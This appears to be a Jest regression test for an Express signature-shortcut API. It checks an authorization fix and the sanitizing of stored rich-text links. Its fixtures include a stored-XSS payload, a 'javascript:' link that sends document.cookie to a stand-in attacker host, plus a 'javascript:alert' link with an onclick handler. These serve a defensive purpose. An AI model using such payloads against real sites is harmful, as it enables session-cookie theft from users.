// GOO-6 / FH12 : un référent pouvait modifier la signature d'un agent (PATCH /shortcut/:id sans contrôle
// de propriétaire) et y glisser un lien `javascript:`, inséré ensuite dans l'éditeur des agents nationaux.
const express = require("express");
const request = require("supertest");

const AGENT_SHORTCUT_ID = "aaaaaaaaaaaaaaaaaaaaaaaa";
const REFERENT_SHORTCUT_ID = "bbbbbbbbbbbbbbbbbbbbbbbb";

let mockCurrentUser;

jest.mock("../middlewares/authenticationGuards", () => ({
  agentGuard: (req, _res, next) => {
    req.user = mockCurrentUser;
    next();
  },
}));

jest.mock("../models/shortcut", () => ({
  findById: jest.fn(),
  findOne: jest.fn(),
  findOneAndUpdate: jest.fn().mockResolvedValue(undefined),
  findByIdAndDelete: jest.fn().mockResolvedValue(undefined),
  create: jest.fn().mockResolvedValue(undefined),
}));

const ShortcutModel = require("../models/shortcut");
const { validationErrorHandler } = require("../middlewares/validation");
const shortcutRouter = require("../controllers/shortcut");

const SHORTCUTS = {
  [AGENT_SHORTCUT_ID]: { _id: AGENT_SHORTCUT_ID, userRole: "AGENT", isSignature: true },
  [REFERENT_SHORTCUT_ID]: { _id: REFERENT_SHORTCUT_ID, userRole: "REFERENT_REGION", userRegion: "Bretagne" },
};

const buildApp = () => {
  const app = express();
  app.use(express.json());
  app.use("/shortcut", shortcutRouter);
  app.use(validationErrorHandler);
  return app;
};

const REFERENT = { _id: "cccccccccccccccccccccccc", role: "REFERENT_REGION", region: "Bretagne" };
const AGENT = { _id: "dddddddddddddddddddddddd", role: "AGENT" };
const maliciousContent = [{ type: "paragraph", children: [{ type: "link", url: "javascript:fetch('//evil.example?c='+document.cookie)", children: [{ text: "Cordialement" }] }] }];

beforeEach(() => {
  jest.clearAllMocks();
  ShortcutModel.findById.mockImplementation(async (id) => SHORTCUTS[id] || null);
});

describe("PATCH /shortcut/:id", () => {
  it("forbids a referent from editing an agent signature", async () => {
    mockCurrentUser = REFERENT;
    const res = await request(buildApp()).patch(`/shortcut/${AGENT_SHORTCUT_ID}`).send({ text: "<p>x</p>" });
    expect(res.status).toBe(403);
    expect(ShortcutModel.findOneAndUpdate).not.toHaveBeenCalled();
  });

  it("forbids a referent from deleting an agent signature", async () => {
    mockCurrentUser = REFERENT;
    const res = await request(buildApp()).delete(`/shortcut/${AGENT_SHORTCUT_ID}`);
    expect(res.status).toBe(403);
    expect(ShortcutModel.findByIdAndDelete).not.toHaveBeenCalled();
  });

  it("lets a referent edit their own shortcut, with its links and HTML neutralized", async () => {
    mockCurrentUser = REFERENT;
    const res = await request(buildApp())
      .patch(`/shortcut/${REFERENT_SHORTCUT_ID}`)
      .send({ content: maliciousContent, text: '<p><a href="javascript:alert(1)" onclick="alert(1)">Cordialement</a></p>' });
    expect(res.status).toBe(200);
    expect(ShortcutModel.findOneAndUpdate).toHaveBeenCalledWith(
      { _id: REFERENT_SHORTCUT_ID },
      { content: [{ type: "paragraph", children: [{ text: "Cordialement" }] }], text: "<p><a>Cordialement</a></p>" }
    );
  });

  it("returns 404 for an unknown shortcut", async () => {
    mockCurrentUser = AGENT;
    const res = await request(buildApp()).patch("/shortcut/eeeeeeeeeeeeeeeeeeeeeeee").send({ status: false });
    expect(res.status).toBe(404);
  });
});

describe("POST /shortcut", () => {
  it("stores a signature with its content neutralized", async () => {
    mockCurrentUser = AGENT;
    const res = await request(buildApp())
      .post("/shortcut")
      .send({ name: "Signature", text: "<p>Cordialement</p>", content: maliciousContent, dest: ["young"], keyword: [], isSignature: true });
    expect(res.status).toBe(200);
    expect(ShortcutModel.create).toHaveBeenCalledWith(
      expect.objectContaining({ isSignature: true, userRole: "AGENT", content: [{ type: "paragraph", children: [{ text: "Cordialement" }] }] })
    );
  });
});

describe("GET /shortcut", () => {
  it("serves an agent only an agent signature", async () => {
    mockCurrentUser = AGENT;
    ShortcutModel.findOne.mockResolvedValue(null);
    await request(buildApp()).get("/shortcut").query({ signatureDest: "young" });
    expect(ShortcutModel.findOne).toHaveBeenCalledWith({ isSignature: true, dest: { $in: ["young"] }, userRole: "AGENT" });
  });
});
